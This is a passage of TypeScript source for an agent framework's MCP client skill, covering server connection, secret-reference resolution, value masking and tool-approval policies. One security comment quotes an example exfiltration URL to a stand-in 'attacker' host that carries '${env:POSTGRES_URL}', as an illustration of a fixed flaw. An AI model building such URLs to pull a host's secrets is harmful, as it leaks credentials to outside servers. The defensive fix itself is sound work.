import { Skill } from '../../core/skill';
import { tool } from '../../core/decorators';
import type { Context, Tool, StructuredToolResult, PricingConfig } from '../../core/types';
import type { ContentItem, ImageContent } from '../../uamp/types';
import { ensureContentId } from '../../uamp/content';
import {
  SecretReferenceError,
  atConnectSentence,
  expandReferences,
  maskMap,
  maskText,
  maskUrl,
  type ReferenceLookup,
} from '../secrets/references';
import {
  mcpProblemLine,
  mcpServersFromConfig,
  mcpSdkMissing,
  qualifiedToolName,
  type McpServersResolution,
  type ResolvedMcpTransport,
} from './config';

// ---------------------------------------------------------------------------
// The MCP SDK, loaded when the skill loads
// ---------------------------------------------------------------------------

/* eslint-disable @typescript-eslint/no-explicit-any */

/** The client half of `@modelcontextprotocol/sdk`, as this skill uses it. */
export interface McpClientSdk {
  Client: any;
  StdioClientTransport: any;
  /** Absent in an SDK build without the transport. */
  SSEClientTransport?: any;
  StreamableHTTPClientTransport?: any;
  /** The variables a stdio server gets besides its own `env` (PATH, HOME and the like); absent in an older SDK. */
  getDefaultEnvironment?: () => Record<string, string>;
}

/** How each SDK module is imported; a test hands in one that fails. */
export interface McpSdkImports {
  client: () => Promise<any>;
  stdio: () => Promise<any>;
  sse: () => Promise<any>;
  http: () => Promise<any>;
}

// Dynamic, with literal specifiers (`@vite-ignore`, `as string`): the portal
// typechecks this source against a node_modules that may not carry the
// package, and a static import would fail that gate instead of this load.
const DEFAULT_IMPORTS: McpSdkImports = {
  client: () => import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/index.js' as string),
  stdio: () => import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/stdio.js' as string),
  sse: () => import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/sse.js' as string),
  http: () => import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/streamableHttp.js' as string),
};

let loadedSdk: McpClientSdk | undefined;

/**
 * The SDK, or an error that says what failed (2026-09-26). `ensureMCP()` used
 * to answer `false`, and `initialize()` then printed one console line and
 * returned: an agent whose file named MCP servers started with none of their
 * tools, and nothing in its startup report said why. The package is a declared
 * dependency now; if it still cannot load, the agent file's loader reports
 * this skill as failed, with the reason, as it does any other skill
 * (`skills/resolve.ts`). The message is pinned by the shared fixture.
 */
export async function loadMcpSdk(imports: Partial<McpSdkImports> = {}): Promise<McpClientSdk> {
  if (loadedSdk) return loadedSdk;
  const modules = { ...DEFAULT_IMPORTS, ...imports };
  let clientMod: any;
  let stdioMod: any;
  try {
    clientMod = await modules.client();
    stdioMod = await modules.stdio();
  } catch (err) {
    throw new Error(mcpSdkMissing((err as Error)?.message ?? String(err)));
  }
  const sdk: McpClientSdk = { Client: clientMod?.Client, StdioClientTransport: stdioMod?.StdioClientTransport };
  if (typeof sdk.Client !== 'function' || typeof sdk.StdioClientTransport !== 'function') {
    throw new Error(mcpSdkMissing('the package has no Client or StdioClientTransport export'));
  }
  if (typeof stdioMod?.getDefaultEnvironment === 'function') sdk.getDefaultEnvironment = stdioMod.getDefaultEnvironment;
  // The two remote transports are optional: an SDK build without one still
  // serves stdio servers, and a remote server that needs it is reported then.
  try {
    sdk.SSEClientTransport = (await modules.sse()).SSEClientTransport;
  } catch {
    // no SSE transport in this build
  }
  try {
    sdk.StreamableHTTPClientTransport = (await modules.http()).StreamableHTTPClientTransport;
  } catch {
    // no Streamable HTTP transport in this build
  }
  loadedSdk = sdk;
  return sdk;
}

/** Forget the loaded SDK, so a test can load it again with other imports. */
export function resetMcpSdkForTests(): void {
  loadedSdk = undefined;
}

let MCPClient: any;
let StdioTransport: any;
let SSETransport: any;
let StreamableHTTPTransport: any;
let DefaultEnvironment: (() => Record<string, string>) | undefined;

/**
 * Why a server did not connect: the sentence (every resolved value masked)
 * and, when a `${secret:NAME}` was not stored, the names, so `doctor` can
 * print the `webagents secrets set` command that fixes it.
 */
export class McpConnectError extends Error {
  readonly missingSecrets: string[];
  /** `${env:NAME}` variables that are not set (2026-09-26), for `doctor`'s fix line. */
  readonly missingEnv: string[];

  constructor(message: string, missingSecrets: string[] = [], missingEnv: string[] = []) {
    super(message);
    this.name = 'McpConnectError';
    this.missingSecrets = missingSecrets;
    this.missingEnv = missingEnv;
  }
}

/** One server as `serverReport()` describes it (interactive-mode spec 3.7): never a value. */
export interface McpServerReportRow {
  name: string;
  transport: ResolvedMcpTransport | 'unknown';
  connected: boolean;
  /** The qualified names of the tools it registered. */
  tools: string[];
  /** Why it is not connected, when it tried and failed. */
  error?: string;
  /** Why the loader refused it, when it never tried. */
  rejected?: string;
  /** `${secret:NAME}` references that are not stored. */
  missingSecrets: string[];
  /** `${env:NAME}` variables that are not set (2026-09-26), for `doctor`'s fix line. */
  missingEnv?: string[];
  /** The loader's warnings about secret-looking literals. */
  warnings: string[];
  /** Its `env`, `headers` and address as a report may show them: references as written, everything else masked. */
  env?: Record<string, string>;
  headers?: Record<string, string>;
  url?: string;
}

// ---------------------------------------------------------------------------
// Local type definitions for MCP protocol objects
// ---------------------------------------------------------------------------

interface MCPToolDef {
  name: string;
  description?: string;
  inputSchema?: Record<string, unknown>;
}

interface MCPResource {
  uri: string;
  name?: string;
  description?: string;
  mimeType?: string;
}

interface MCPPromptArg {
  name: string;
  description?: string;
  required?: boolean;
}

interface MCPPrompt {
  name: string;
  description?: string;
  arguments?: MCPPromptArg[];
}

// ---------------------------------------------------------------------------
// Config interfaces
// ---------------------------------------------------------------------------

export type MCPTransportKind = 'sse' | 'http' | 'auto';
export type MCPAuthType = 'none' | 'api_key' | 'api_key_query' | 'oauth2';

export interface MCPServerConfig {
  command?: string;
  args?: string[];
  env?: Record<string, string>;
  cwd?: string;
  url?: string;
  httpUrl?: string;
  headers?: Record<string, string>;
  /** Per-tool pricing in credits (monetized MCP servers) */
  pricing?: {
    creditsPerCall?: number;
    creditsPerToken?: { inputPer1k: string; outputPer1k: string; cacheReadPer1k?: string } | null;
    reason?: string;
  };
  /** If set, only these tool names (from the server) are registered */
  enabledTools?: string[];
  /**
   * Per-tool policy map. Tool names mapped to:
   *   - 'allow'  : execute immediately (default for unmapped tools)
   *   - 'notify' : execute only after `policyHook` resolves to 'approved'
   *   - 'block'  : tool is filtered out at registration time entirely
   *
   * Independent of `enabledTools` — `enabledTools` is the legacy whitelist
   * (still honoured), `toolPolicies` is the new tri-state superset. When
   * both are present, `toolPolicies['<tool>'] === 'block'` always wins.
   */
  toolPolicies?: Record<string, 'allow' | 'notify' | 'block'>;
  /**
   * Approval hook for `notify`-policy tools. Called once per tool
   * invocation, before `session.callTool`, with the qualified tool name
   * + raw args. The host (PortalMCPFactory) implements this by creating
   * a `tool_approval` notification and waiting for the owner's response.
   *
   * Skill-level default if not set: treat 'notify' as 'allow' (effectively
   * making the policy a no-op). Production runtimes always inject a hook
   * via PortalMCPFactory.
   */
  policyHook?: (info: {
    server: string;
    toolName: string;
    qualifiedName: string;
    args: unknown;
  }) => Promise<'approved' | 'rejected'>;

  // Transport / auth (Phase 1 of mcp-oauth-and-catalog plan)
  transport?: MCPTransportKind;
  authType?: MCPAuthType;
  /**
   * Runtime credential resolved by the host application (e.g. PortalMCPFactory).
   * For `oauth2` this is applied as `Authorization: Bearer <token>`.
   * For `api_key` this is applied as `<headerName>: <token>` when configured,
   * or legacy `Authorization: Bearer <token>` when no custom header is set.
   * For `api_key_query` the token is substituted into `mcpUrlTemplate` (or the
   * URL's `urlQuery` placeholder) at connect time and never sent as a header.
   */
  auth?: { type: MCPAuthType; token: string; headerName?: string };
  /**
   * Optional URL template — used for `api_key_query` providers (e.g. Browserbase
   * `https://mcp.browserbase.com/mcp?browserbaseApiKey={apiKey}`). Placeholders
   * use `{name}` syntax. The resolved URL is in-memory only and never persisted
   * back into the saved `skills.mcp[name].url`.
   */
  mcpUrlTemplate?: string;
  /** Non-secret query options merged into the URL (e.g. Supabase project_ref). */
  urlQuery?: Record<string, string | boolean>;
  /** Provider-level dynamic instructions, registered as a single compact prompt. */
  prompt?: { name?: string; priority?: number; text: string };
}

/** What `${secret:NAME}` reads: null or undefined means "not stored". */
export type SecretReader = (name: string) => Promise<string | null | undefined> | string | null | undefined;

/**
 * The sources `${env:NAME}` and `${secret:NAME}` resolve from (S-292), and
 * the switch that turns resolution on at all (S-295, 2026-09-26).
 */
export interface ReferenceSources {
  /** What `${env:NAME}` reads. */
  env: Record<string, string | undefined>;
  /** What `${secret:NAME}` reads. */
  secret: SecretReader;
}

export interface MCPSkillConfig {
  agentName?: string;
  agentPath?: string;
  baseDir?: string;
  mcp?: Record<string, MCPServerConfig> | { mcpServers: Record<string, MCPServerConfig> };
  /**
   * RESOLUTION IS OFF UNLESS THIS IS SET (S-295, CRITICAL, 2026-09-26). The
   * skill resolved `${env:NAME}` and `${secret:NAME}` in every server's url,
   * headers and env against `process.env` and the CLI keystore for EVERY
   * `MCPSkill`, so a host that builds one from data its users saved (the
   * portal, from a hosted agent's MCP entries) expanded
   * `https://attacker/mcp?k=${env:POSTGRES_URL}` from its OWN environment and
   * sent the value to that server. Now nothing is expanded unless the builder
   * hands in the sources: a `${...}` in any field is sent as the literal bytes
   * written. Only the agent-file loaders pass sources (`ownerReferenceSources`:
   * the process environment and the keystore `webagents secrets set` writes),
   * for a file the local owner wrote and runs. A host never does.
   */
  references?: ReferenceSources;
  [key: string]: unknown;
}

/**
 * The sources an agent file's servers resolve against: the process
 * environment, and the CLI's own secret store (the one `webagents secrets set
 * NAME` writes, for the active profile), opened on the first reference and
 * never before. For the agent-file loaders only (`skills/resolve.ts`, the
 * Python `cli/agent_builder.py`); see `MCPSkillConfig.references`.
 */
/**
 * The refusal a `notify` tool answers when no host hook can ask for approval
 * (S-286 addendum, 2026-09-26): the fixture's `tool_policies.no_hook.refusal`,
 * `{name}` being the qualified tool name.
 */
export const NOTIFY_NO_HOOK_REFUSAL =
  'Error: {name} needs approval (its policy is notify) and nothing here can ask for it, so it did not run. Use allow to run it or block to withhold it.';

export function notifyNoHookRefusal(name: string): string {
  return NOTIFY_NO_HOOK_REFUSAL.replace('{name}', name);
}

export function ownerReferenceSources(env: Record<string, string | undefined> = process.env): ReferenceSources {
  let store: Promise<{ get(name: string): Promise<string | null> }> | undefined;
  return {
    env,
    secret: async (name) => {
      if (!store) store = import('../../cli/provider-keys.js').then(({ providerKeyStore }) => providerKeyStore());
      return (await store).get(name);
    },
  };
}

// ---------------------------------------------------------------------------
// Internal bookkeeping per registered MCP tool
// ---------------------------------------------------------------------------

interface ToolRegistryEntry {
  server: string;
  originalName: string;
  description: string;
  inputSchema: Record<string, unknown>;
  pricing?: MCPServerConfig['pricing'];
}

// ---------------------------------------------------------------------------
// MCPSkill
// ---------------------------------------------------------------------------

/**
 * Where an MCP stdio server's stderr goes (B8, 2026-09-28): a descriptor
 * appending to `<profile folder>/logs/mcp-<name>.log`, the folder the chat's
 * log is in, never the terminal the chat draws on. `undefined` when that
 * folder cannot be written; the caller then discards the output. The Python
 * twin is `local/mcp/skill.py` `mcp_stderr_log`.
 */
export async function mcpStderrLog(name: string): Promise<number | undefined> {
  try {
    const fs = await import('node:fs');
    const path = await import('node:path');
    const { globalDir } = await import('../../cli/config-store');
    const folder = path.join(globalDir(), 'logs');
    fs.mkdirSync(folder, { recursive: true });
    const safe = name.replace(/[^A-Za-z0-9._-]/g, '_') || 'server';
    return fs.openSync(path.join(folder, `mcp-${safe}.log`), 'a');
  } catch {
    return undefined;
  }
}

function closeStderrLog(fd: number | undefined): void {
  if (fd === undefined) return;
  import('node:fs')
    .then((fs) => fs.closeSync(fd))
    .catch(() => undefined);
}

export class MCPSkill extends Skill {
  private mcpConfig: MCPSkillConfig;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  private sessions: Map<string, any> = new Map();
  private toolsRegistry: Map<string, ToolRegistryEntry> = new Map();
  private resources: Map<string, MCPResource[]> = new Map();
  private mcpPrompts: Map<string, MCPPrompt[]> = new Map();
  private _initialized = false;
  private _cleanupFns: Array<() => Promise<void>> = [];
  /** What the file named, as the normalizer read it, for `serverReport()`. */
  private resolution: McpServersResolution | undefined;
  /** Why a server did not connect, by name, masked (S-292). */
  private connectErrors: Map<string, { message: string; missingSecrets: string[]; missingEnv: string[] }> = new Map();
  /**
   * Where the servers were read from (the chat's `/mcp`, interactive-mode
   * spec 3.7): the config handed in (the agent file's `- mcp:` entry), or
   * `mcp.json` next to the agent.
   */
  configSource: 'config' | 'mcp.json' = 'config';
  constructor(config: MCPSkillConfig = {}) {
    super({ name: 'MCPSkill' });
    this.mcpConfig = config;
  }

  // =========================================================================
  // Lifecycle
  // =========================================================================

  override async initialize(): Promise<void> {
    if (this._initialized) return;

    // Throws, with the reason, when the SDK cannot load (`loadMcpSdk`).
    const sdk = await loadMcpSdk();
    MCPClient = sdk.Client;
    StdioTransport = sdk.StdioClientTransport;
    SSETransport = sdk.SSEClientTransport;
    StreamableHTTPTransport = sdk.StreamableHTTPClientTransport;
    DefaultEnvironment = sdk.getDefaultEnvironment;

    const resolution = await this._loadMCPConfig();
    this.resolution = resolution;
    // Said once, at load (S-292): a literal that looks like a key, with the
    // reference and the command that keep it out of the file.
    for (const { name, reason } of resolution.warnings) {
      console.warn(mcpProblemLine('warning', name, reason));
    }
    const servers = resolution.configs as Record<string, MCPServerConfig>;
    if (Object.keys(servers).length === 0) {
      return;
    }

    const names = Object.keys(servers);
    const results = await Promise.allSettled(names.map((name) => this._connectServer(name, servers[name])));

    for (const [index, result] of results.entries()) {
      if (result.status === 'rejected') {
        // The message only, already masked by `_connectServer`: the error
        // object itself could carry a transport's request and repeat a value.
        const reason = (result.reason as Error)?.message ?? String(result.reason);
        console.error(mcpProblemLine('failed', names[index], reason));
      }
    }

    // Register a single compact dynamic prompt with one bullet per configured
    // server that supplied a `prompt.text`. This puts catalog-defined provider
    // guidance in front of the model alongside the rest of the system prompt
    // without polluting it for unrelated agents (only triggers when MCP servers
    // are actually mounted on this agent).
    const promptEntries: Array<{ name: string; priority: number; text: string }> = [];
    for (const [name, cfg] of this.serverConfigs.entries()) {
      const p = cfg.prompt;
      if (p && typeof p.text === 'string' && p.text.trim().length > 0) {
        // Truncate to 1024 chars to match the save-route validation cap.
        const text = p.text.trim().slice(0, 1024);
        promptEntries.push({
          name: p.name ?? `mcp_${name}`,
          priority: typeof p.priority === 'number' ? p.priority : 60,
          text,
        });
      }
    }
    if (promptEntries.length > 0) {
      const minPriority = Math.min(...promptEntries.map((e) => e.priority));
      this.registerPrompt({
        name: 'mcp-integrations',
        priority: minPriority,
        scope: 'all',
        handler: () => {
          const lines = ['MCP INTEGRATIONS:'];
          for (const e of promptEntries) {
            // Use the first non-empty line as the bullet body to keep this compact.
            const body = e.text.split(/\n+/).find((s) => s.trim().length > 0) ?? e.text;
            lines.push(`- ${e.name.replace(/^mcp_/, '')}: ${body}`);
          }
          return lines.join('\n');
        },
      });
    }

    this._initialized = true;
  }

  override async cleanup(): Promise<void> {
    for (const fn of this._cleanupFns) {
      try {
        await fn();
      } catch (e) {
        console.error('[MCPSkill] Cleanup error:', e);
      }
    }
    this._cleanupFns = [];
    this.sessions.clear();
    this.serverConfigs.clear();
    this.toolsRegistry.clear();
    this.resources.clear();
    this.mcpPrompts.clear();
    this.connectErrors.clear();
    this.resolution = undefined;
    this._initialized = false;
  }

  // =========================================================================
  // Config loading
  // =========================================================================

  /**
   * The servers to connect to: the config given directly, in either shape
   * (`config.ts`, pinned by the shared fixture), else `mcp.json` next to the
   * agent, which a bare `- mcp` entry means, as it does in Python. A server
   * the normalizer rejects is named, and the others still load.
   */
  private async _loadMCPConfig(): Promise<McpServersResolution> {
    let raw: unknown = this.mcpConfig.mcp;
    this.configSource = 'config';
    if (!raw || (typeof raw === 'object' && Object.keys(raw as object).length === 0)) {
      raw = await this._readMcpJson();
      this.configSource = 'mcp.json';
    }
    const resolution = mcpServersFromConfig(raw);
    for (const { name, reason } of resolution.rejected) {
      console.warn(mcpProblemLine('rejected', name, reason));
    }
    return resolution;
  }

  // =========================================================================
  // Secrets (S-292)
  // =========================================================================

  /**
   * `config` with every reference in `env`, `headers` and the address
   * replaced, for this connection only. `config` itself stays as written,
   * so nothing that reports or saves a configuration can see a value.
   * Throws {@link McpConnectError} with the connect-time sentence, which
   * names the reference and never a value.
   *
   * ONLY WITH SOURCES (S-295): a skill built without `references` expands
   * nothing, and every field is used as the literal bytes written.
   */
  private async resolveReferences(name: string, config: MCPServerConfig): Promise<{ live: MCPServerConfig; values: string[] }> {
    const values: string[] = [];
    const sources = this.mcpConfig.references;
    if (!sources) return { live: { ...config }, values };
    const lookup: ReferenceLookup = { secret: (n) => sources.secret(n), env: sources.env };
    const expand = async (value: string, field: string, key?: string): Promise<string> => {
      try {
        const expanded = await expandReferences(value, lookup);
        values.push(...expanded.values);
        return expanded.text;
      } catch (err) {
        if (err instanceof SecretReferenceError) {
          throw new McpConnectError(atConnectSentence(name, field, key, err.message), err.missingSecret ? [err.missingSecret] : [], err.missingEnv ? [err.missingEnv] : []);
        }
        throw err;
      }
    };
    const live: MCPServerConfig = { ...config };
    if (config.env) {
      live.env = {};
      for (const [key, value] of Object.entries(config.env)) live.env[key] = await expand(String(value), 'env', key);
    }
    if (config.headers) {
      live.headers = {};
      for (const [key, value] of Object.entries(config.headers)) live.headers[key] = await expand(String(value), 'headers', key);
    }
    for (const field of ['url', 'httpUrl', 'mcpUrlTemplate'] as const) {
      const value = config[field];
      if (typeof value === 'string' && value) live[field] = await expand(value, field);
    }
    return { live, values };
  }

  /**
   * Every server the file named, for `/mcp` and `doctor`: connected or not,
   * its tools, why it failed or was refused, the loader's warnings, and its
   * configuration with references as written and every other value masked.
   */
  serverReport(): McpServerReportRow[] {
    const rows: McpServerReportRow[] = [];
    const resolution = this.resolution;
    if (!resolution) return rows;
    for (const server of resolution.servers) {
      const failure = this.connectErrors.get(server.name);
      const row: McpServerReportRow = {
        name: server.name,
        transport: server.transport,
        connected: this.sessions.has(server.name),
        tools: [...this.toolsRegistry.entries()]
          .filter(([, entry]) => entry.server === server.name)
          .map(([qualified]) => qualified)
          .sort(),
        missingSecrets: failure?.missingSecrets ?? [],
        missingEnv: failure?.missingEnv ?? [],
        warnings: resolution.warnings.filter((w) => w.name === server.name).map((w) => w.reason),
      };
      if (failure) row.error = failure.message;
      if (server.env) row.env = maskMap(server.env);
      if (server.headers && Object.keys(server.headers).length) row.headers = maskMap(server.headers);
      if (server.url) row.url = maskUrl(server.url);
      rows.push(row);
    }
    for (const { name, reason } of resolution.rejected) {
      rows.push({ name, transport: 'unknown', connected: false, tools: [], rejected: reason, missingSecrets: [], warnings: [] });
    }
    return rows;
  }

  /** `mcp.json` next to the agent (Node only); nothing when there is none. */
  private async _readMcpJson(): Promise<unknown> {
    const baseDir =
      this.mcpConfig.baseDir ??
      this.mcpConfig.agentPath ??
      (typeof process !== 'undefined' ? process.cwd() : undefined);
    if (!baseDir) return undefined;
    try {
      const fs = await import('node:fs/promises');
      const path = await import('node:path');
      return JSON.parse(await fs.readFile(path.join(baseDir, 'mcp.json'), 'utf-8')) as unknown;
    } catch {
      return undefined;
    }
  }

  // =========================================================================
  // Server connection
  // =========================================================================

  /** Pricing config per server, indexed by server name */
  private serverPricing: Map<string, MCPServerConfig['pricing']> = new Map();
  /** Full server config by name (for discovery-time options like enabledTools) */
  private serverConfigs: Map<string, MCPServerConfig> = new Map();

  /**
   * Compose the final transport URL for an HTTP/SSE MCP server.
   *
   * Steps (in order; each step is independent so failure in one doesn't
   * silently fall through to a less-validated path):
   *   1. Start from `config.url` or `config.mcpUrlTemplate`. If a template is
   *      supplied, substitute placeholders from `auth.token` (when
   *      `authType === 'api_key_query'`) and from `urlQuery` non-secret options.
   *   2. Append remaining `urlQuery` keys via `URLSearchParams`.
   *   3. For `api_key_query` without a template, append `requiredCredential`
   *      from a single placeholder set on `urlQuery.__credentialKey` if present.
   *
   * Returns `{ url, queryAuth }` where `queryAuth` is true when the URL embeds
   * the api_key_query credential (so we can skip emitting a Bearer header).
   */
  private _composeServerUrl(name: string, config: MCPServerConfig): { url: URL; queryAuth: boolean } | null {
    const template = config.mcpUrlTemplate;
    let working: URL | null = null;
    let queryAuth = false;

    if (template) {
      // Substitute `{key}` placeholders. For `api_key_query` we use auth.token
      // if no explicit `urlQuery[key]` overrides; everything else comes from
      // `urlQuery`. Unsubstituted placeholders fail the connection so we never
      // ship a literal `{...}` to the provider.
      const substitutions: Record<string, string> = {};
      if (config.urlQuery) {
        for (const [k, v] of Object.entries(config.urlQuery)) {
          substitutions[k] = String(v);
        }
      }
      if (config.authType === 'api_key_query' && config.auth?.token) {
        const placeholders = Array.from(template.matchAll(/\{([a-zA-Z_][a-zA-Z0-9_]*)\}/g)).map(m => m[1]);
        for (const p of placeholders) {
          if (!(p in substitutions)) substitutions[p] = config.auth.token;
        }
        queryAuth = true;
      }
      let resolved = template;
      for (const [k, v] of Object.entries(substitutions)) {
        resolved = resolved.replaceAll(`{${k}}`, encodeURIComponent(v));
      }
      if (/\{[a-zA-Z_]/.test(resolved)) {
        console.warn(`[MCPSkill] Server "${name}" has unresolved URL template placeholders.`);
        return null;
      }
      try {
        working = new URL(resolved);
      } catch {
        console.warn(`[MCPSkill] Server "${name}" produced an invalid URL from its template.`);
        return null;
      }
    } else if (config.url) {
      try {
        working = new URL(config.url);
      } catch {
        console.warn(`[MCPSkill] Server "${name}" has an invalid URL.`);
        return null;
      }
    } else {
      return null;
    }

    // Merge non-secret urlQuery options that weren't consumed by the template.
    if (config.urlQuery) {
      for (const [k, v] of Object.entries(config.urlQuery)) {
        if (!working.searchParams.has(k) && working.toString().indexOf(`${k}=`) < 0) {
          working.searchParams.set(k, String(v));
        }
      }
    }

    return { url: working, queryAuth };
  }

  private _resolveTransportKind(config: MCPServerConfig): MCPTransportKind {
    const t = config.transport;
    if (t === 'http' || t === 'sse' || t === 'auto') return t;
    return 'auto';
  }

  /**
   * Connect one server. The config is kept AS WRITTEN in `serverConfigs`;
   * the copy with references resolved (`live`) exists for this call only.
   * Whatever fails, the error that leaves here is a plain sentence with
   * every resolved value masked, recorded for `serverReport()`.
   */
  private async _connectServer(name: string, config: MCPServerConfig): Promise<void> {
    this.serverConfigs.set(name, config);
    if (config.pricing) {
      this.serverPricing.set(name, config.pricing);
    }
    let values: string[] = [];
    try {
      const resolved = await this.resolveReferences(name, config);
      values = resolved.values;
      await this._openServer(name, resolved.live);
    } catch (err) {
      const message = maskText((err as Error)?.message ?? String(err), values);
      const missingSecrets = err instanceof McpConnectError ? err.missingSecrets : [];
      const missingEnv = err instanceof McpConnectError ? err.missingEnv : [];
      this.connectErrors.set(name, { message, missingSecrets, missingEnv });
      throw new McpConnectError(message, missingSecrets, missingEnv);
    }
  }

  private async _openServer(name: string, live: MCPServerConfig): Promise<void> {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    let transport: any;
    // The descriptor a stdio server's stderr is written to (B8); undefined otherwise.
    let stderrLog: number | undefined;

    if (live.url || live.mcpUrlTemplate) {
      const composed = this._composeServerUrl(name, live);
      if (!composed) return;
      const { url, queryAuth } = composed;

      // Build the Authorization header for header-based auth modes only.
      // - oauth2            → `Authorization: Bearer <token>` (header)
      // - api_key           → custom raw header, or legacy Authorization bearer
      // - api_key_query     → token is in URL; no header
      // - none              → no auth at all
      const headers: Record<string, string> = { ...(live.headers ?? {}) };
      const authType = live.authType ?? (live.auth?.type as MCPAuthType | undefined) ?? 'none';
      if (!queryAuth && live.auth?.token && (authType === 'oauth2' || authType === 'api_key')) {
        if (authType === 'api_key') {
          headers[live.auth.headerName || 'Authorization'] = live.auth.headerName
            ? live.auth.token
            : `Bearer ${live.auth.token}`;
        } else {
          headers[live.auth.headerName || 'Authorization'] = `Bearer ${live.auth.token}`;
        }
      }

      const requestInit: RequestInit = Object.keys(headers).length ? { headers } : {};
      const transportKind = this._resolveTransportKind(live);

      const tryHttp = transportKind === 'http' || transportKind === 'auto';
      const trySse = transportKind === 'sse' || transportKind === 'auto';

      if (tryHttp && StreamableHTTPTransport) {
        try {
          transport = new StreamableHTTPTransport(url, { requestInit });
        } catch (err) {
          if (transportKind === 'http') {
            console.warn(`[MCPSkill] Server "${name}" Streamable HTTP construction failed:`, err);
            return;
          }
          transport = undefined;
        }
      }
      if (!transport && trySse) {
        if (!SSETransport) {
          console.warn(`[MCPSkill] SSE transport unavailable — skipping server "${name}".`);
          return;
        }
        transport = new SSETransport(url, { requestInit });
      }
      if (!transport) {
        console.warn(`[MCPSkill] No usable transport for server "${name}".`);
        return;
      }
    } else if (live.command) {
      // The MCP SDK's default environment (PATH, HOME and the like) plus
      // ONLY this entry's `env`, resolved (S-292, 2026-09-26). It was
      // `{...process.env, ...env}` whenever `env` was set: every variable of
      // the agent process, provider keys included, went to a server that
      // `npx -y` had just fetched.
      const base = DefaultEnvironment ? DefaultEnvironment() : {};
      // THE SERVER'S STDERR IS NOT THE CHAT'S (B8, 2026-09-28): the
      // transport's default, `inherit`, drew a server's banner and warnings
      // over the chat. It goes to `<profile folder>/logs/mcp-<name>.log`
      // (`mcpStderrLog`); the child keeps its own copy of the descriptor, so
      // this process closes its copy once the child is started.
      stderrLog = await mcpStderrLog(name);
      transport = new StdioTransport({
        command: live.command,
        args: live.args ?? [],
        env: { ...base, ...(live.env ?? {}) },
        cwd: live.cwd,
        stderr: stderrLog ?? 'ignore',
      });
    } else {
      console.warn(
        `[MCPSkill] Server "${name}" has neither command nor url — skipping.`,
      );
      return;
    }

    const client = new MCPClient(
      { name: this.mcpConfig.agentName ?? 'webagents', version: '1.0.0' },
      { capabilities: { tools: {}, resources: {}, prompts: {} } },
    );

    try {
      await client.connect(transport);
    } catch (err) {
      closeStderrLog(stderrLog);
      stderrLog = undefined;
      // If `auto` failed via HTTP, fall back to SSE once.
      if (this._resolveTransportKind(live) === 'auto' && transport && SSETransport) {
        try {
          const composed = this._composeServerUrl(name, live);
          if (composed) {
            const headers: Record<string, string> = { ...(live.headers ?? {}) };
            const authType = live.authType ?? 'none';
            if (!composed.queryAuth && live.auth?.token && (authType === 'oauth2' || authType === 'api_key')) {
              if (authType === 'api_key') {
                headers[live.auth.headerName || 'Authorization'] = live.auth.headerName
                  ? live.auth.token
                  : `Bearer ${live.auth.token}`;
              } else {
                headers[live.auth.headerName || 'Authorization'] = `Bearer ${live.auth.token}`;
              }
            }
            const fallback = new SSETransport(composed.url, { requestInit: { headers } });
            await client.connect(fallback);
            transport = fallback;
          } else {
            throw err;
          }
        } catch {
          throw err;
        }
      } else {
        throw err;
      }
    }
    // The child has its own copy of the log's descriptor now.
    closeStderrLog(stderrLog);
    this.sessions.set(name, client);

    this._cleanupFns.push(async () => {
      try {
        await client.close();
      } catch {
        // best-effort
      }
    });

    await this._discoverCapabilities(name, client);
  }

  // =========================================================================
  // Capability discovery
  // =========================================================================

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  private async _discoverCapabilities(name: string, session: any): Promise<void> {
    // Tools
    try {
      const toolsResp = await session.listTools();
      let tools: MCPToolDef[] = toolsResp?.tools ?? [];
      // Filter tools by enabledTools allowlist if specified
      const serverConfig = this.serverConfigs.get(name);
      if (Array.isArray(serverConfig?.enabledTools)) {
        const allowed = new Set(serverConfig.enabledTools);
        tools = tools.filter((t) => allowed.has(t.name));
      }
      // Tool-policy 'block' filtering. The new toolPolicies map wins
      // over (and is independent of) the legacy enabledTools list.
      const policies = serverConfig?.toolPolicies;
      if (policies && typeof policies === 'object') {
        tools = tools.filter((t) => policies[t.name] !== 'block');
      }
      for (const t of tools) {
        // `<server>__<tool>`, always: the one rule both SDKs apply (`config.ts`).
        const qualifiedName = qualifiedToolName(name, t.name);
        this.toolsRegistry.set(qualifiedName, {
          server: name,
          originalName: t.name,
          description: t.description ?? `MCP tool: ${t.name}`,
          inputSchema: t.inputSchema ?? {},
          pricing: this.serverPricing.get(name),
        });
        this._registerDynamicTool(qualifiedName, t, name);
      }
    } catch (e) {
      console.warn(`[MCPSkill] Failed to list tools for "${name}":`, e);
    }

    // Resources
    try {
      const resourcesResp = await session.listResources();
      const resources: MCPResource[] = resourcesResp?.resources ?? [];
      if (resources.length > 0) {
        this.resources.set(name, resources);
      }
    } catch {
      // Server may not support resources
    }

    // Prompts
    try {
      const promptsResp = await session.listPrompts();
      const prompts: MCPPrompt[] = promptsResp?.prompts ?? [];
      if (prompts.length > 0) {
        this.mcpPrompts.set(name, prompts);
      }
    } catch {
      // Server may not support prompts
    }
  }

  // =========================================================================
  // Dynamic tool registration
  // =========================================================================

  private _registerDynamicTool(toolName: string, toolDef: MCPToolDef, serverName: string): void {
    const entry = this.toolsRegistry.get(toolName);
    const pricing = entry?.pricing;

    const handler = async (params: Record<string, unknown>, _context: Context): Promise<unknown> => {
      const session = this.sessions.get(serverName);
      if (!session) return `Error: Server "${serverName}" is not connected.`;

      // Tool policy: 'notify' policy + approval hook from the host.
      // 'allow' (or any other value, including default) skips the gate.
      const serverCfg = this.serverConfigs.get(serverName);
      const policy = serverCfg?.toolPolicies?.[toolDef.name];
      // A `notify` tool with NO hook is refused, not run (S-286 addendum,
      // 2026-09-26): the setting failed open, so an agent file that asked
      // for approval of a tool, served by `webagents serve` or the chat
      // with no host hook, ran it without asking. The sentence is the
      // fixture's (`tool_policies.no_hook`).
      if (policy === 'notify' && typeof serverCfg?.policyHook !== 'function') {
        return notifyNoHookRefusal(toolName);
      }
      if (policy === 'notify' && typeof serverCfg?.policyHook === 'function') {
        try {
          const decision = await serverCfg.policyHook({
            server: serverName,
            toolName: toolDef.name,
            qualifiedName: toolName,
            args: params,
          });
          if (decision !== 'approved') {
            return `Error: User declined to approve ${toolName}.`;
          }
        } catch (err) {
          return `Error: Approval check failed for ${toolName}: ${(err as Error).message}`;
        }
      }

      try {
